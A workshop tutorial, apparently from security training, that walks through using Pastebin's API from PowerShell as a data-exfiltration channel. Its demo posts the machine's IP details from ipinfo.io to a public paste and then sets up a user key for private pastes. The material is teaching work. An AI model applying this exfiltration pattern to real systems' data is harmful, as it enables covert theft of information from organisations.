# Pastebin
[Famous website](https://pastebin.com/) for ‚Äúeasy copy and paste‚Äù
- It's Used in a lot of data exfiltration in companies.
- Obviously, many opensource equivalents exist, so an actual hacker will host their own pastebin.

For our workshop, we will just use a free version right now.

So go to [pastebin](https://pastebin.com/) and create a free account. Consider using [mailnesia.com](https://mailnesia.com/) if you don‚Äôt want to use your own private account.

## Get your API-key
On pastebin.com go to the API tab

Find your developer API Key, Never share this with anyone!

![Pastebin developer API Key](../images/developerapikey.png)


Create a new file named logindata.ps1 file with the code below  and copy paste your dev key into that file.

```
$DevKey     =   "PUT-DEVKEY-HERE"
$UserKey    =   "PUT-USER-KEY-HERE"
```
You don't have a UserKey yet.

## First demo

Go to the folder where you previously created logindata.ps1 and create a new file called `new-pastebin.ps1` with the code below. Open your terminal and run new-pastebin.ps1 (don't doubleclick in windows, run it via the Powershell terminal)

1. Observe the results. You will see an URL
2. Visit this URL

```
#Demo 1, Something easy. Userkey won't be used yet so everything is anonymous
. .\logindata.ps1
$Content    =   Invoke-WebRequest -Uri "https://ipinfo.io/json"
$Title      =   "pastebin1"

$Body = @{ 
    api_dev_key         = $DevKey;
    #    api_user_key        = $UserKey;
    api_paste_name	    = $Title;
    api_paste_code      = $Content;
    api_paste_private   = "0"; # 0=public 1=unlisted 2=private
    api_option          = "paste";
    }

Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
```
## Preparing more advanced use of Pastebin
Thus far, so our data exiltration is public.‚Äã Thanks to the API key we can upload to Pastebin but we need to use authentication to make it private, so let‚Äôs make it private‚Äã üòÉ.

For this we need to setup our ‚Äúuserkey‚Äù‚Äã

This means we will use 2 keys‚Äã: 
1. Our dev key, which we already have‚Äã.
2. Our user key, which still needs creation.

### Userkey creation

Create a new file called `get-apiuserkey.ps1`, using the code below.
```
$DevKey     = PUT-DEV-KEY-HERE
$Username   = PUT-PASTEBIN-USERNAME-HERE
$Password   = PUT-PASTEBIN-PASSWORD-HERE
$PasteBinLogin = "https://pastebin.com/api/api_login.php"
$Body = @{ 
    api_dev_key = $DevKey;
    api_user_name	= $Username;
    api_user_password = $Password;
    }

Invoke-WebRequest -Uri $PasteBinLogin -UseBasicParsing -Body $Body -Method Post -OutFile Api_user_key.txt
```
- Fill in the 3 required variables at the top.
- Run the script from the terminal.
- Your userkey is saved in Api_user_key.txt
- Add this key to logindata.ps1


Once this is done‚Ä¶ we‚Äôre cooking!
